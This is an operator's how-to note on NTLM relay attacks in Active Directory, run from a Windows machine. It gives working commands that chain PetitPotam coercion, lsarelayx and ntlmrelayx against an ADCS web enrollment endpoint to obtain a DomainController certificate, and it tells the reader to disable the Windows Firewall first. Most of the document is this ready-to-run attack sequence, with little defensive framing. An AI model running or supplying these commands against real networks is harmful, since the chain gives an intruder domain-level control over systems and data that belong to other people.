**Relay Attacks** — you grab an authentication that a victim machine or user sends to you (its NTLM handshake — the challenge/response Windows uses to prove who it is) and forward it untouched to a different service that trusts that victim. You never crack a password; you sit in the middle and the target treats you as the victim, so you inherit whatever the victim was allowed to do. Mechanically you first coerce or poison the victim into authenticating to you, then relay that live session to a target (SMB, LDAP, HTTP/ADCS (Active Directory Certificate Services), MSSQL) with ntlmrelayx before it expires. On Windows the built-in services grab the listening ports, so you run ntlmrelayx in RAW server mode and point lsarelayx at it (below).

Display of various Coercion Methods vs Realy attacks (credit to https://www.thehacker.recipes):

![[Pasted image 20260512100827.png]]

## How to use a relay on Windows?

On Windows machine to host a relay is not as straight forward as on linux due to in-built Windows services interference. So best way is to use this workflow (disabling windows services is not advised):

- Download from: [https://github.com/CCob/lsarelayx](https://github.com/CCob/lsarelayx) (pre-compiled exe available).
- Run ntlmrelayx in "RAW server mode" first (on the same machine or remote):

**Do all of this as Admin.**

```powershell

 python .\ntlmrelayx.py -t http://10.xx.xx.xxx/certsrv/certfnsh.asp -smb2support --adcs --template Domaincontroller --no-smb-server --no-rpc-server  --no-wcf-server --no-winrm-server --no-mssql-server --no-rdp-server --raw-port 6666

```

- Then run `lsarelayx.exe` to your `ntlmrelayx` raw port.

```powershell

.\lsarelayx.exe --host=127.0.0.1 --port=6666 -v

```

- **Disable Windows Firewall first!**
- Run for PetitPotam or any other coercion tool:

```powershell

 python .\PetitPotam.py -u '' -p '' listener_IP target_IP
```


It works great for self-relay or full attacks and is much cleaner on Windows than the Python version.